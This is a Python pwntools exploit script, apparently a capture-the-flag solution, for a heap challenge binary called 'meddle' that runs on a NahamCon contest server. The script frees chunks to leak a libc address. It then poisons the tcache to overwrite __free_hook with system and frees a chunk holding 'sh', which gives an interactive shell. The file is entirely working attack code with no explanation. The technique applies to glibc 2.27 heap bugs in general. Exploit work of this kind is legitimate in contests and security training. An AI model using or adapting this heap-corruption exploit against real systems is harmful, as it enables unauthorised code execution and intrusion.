#!/usr/bin/env python3

from pwn import *

exe = ELF("./meddle")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

#r = conn()
r = remote("challenge.nahamcon.com", 32335)

def s(n):
    r.sendlineafter("> ", str(n))

def i(t):
    r.recv()
    r.sendline(str(t))

def alloc(album="MAHER", name="AZZOUZI"):
    s(1)
    i(album)
    i(name)

def view(index):
    s(2)
    i(index)

def rate(index, rating):
    s(3)
    i(index)
    i(rating)

def free(index):
    s(4)
    i(index)



def main():
    
    for i in range(0x9):
        alloc()

    for i in range(0x9, 0, -1):
        free(i)
    
    view(1)
    r.recvuntil(": ")
    half0 = hex(u32(r.recv(2).ljust(4, p8(0))))
    r.recvuntil("ratings: ")
    half1 = hex(int(r.recvline().strip()) & 0xffffffff)
    leak = int(half0 + half1[2::], 16)
    log.warn("Libc leak @ 0x%x", leak)
    libc.address = leak - 0x3ebca0
    log.warn("Libc base @ 0x%x", libc.address)
    
    pause()
    
    free_hook = libc.sym['__free_hook']
    half0 = hex(free_hook >> 32)
    half1 = hex(free_hook & 0xffffffff)
    alloc()
    free(3)
    alloc(p64(int(half0, 16)).decode("ISO-8859-1"))
    rate(3, int(half1, 16))
    alloc()

    system = libc.sym.system
    half0 = hex(system >> 32)
    half1 = hex(system & 0xffffffff)

    alloc(p64(int(half0, 16)).decode("ISO-8859-1"))
    rate(12, int(half1, 16))

    rate(1, u32("sh\x00\x00"))
    free(1)
    r.interactive()


if __name__ == "__main__":
    main()
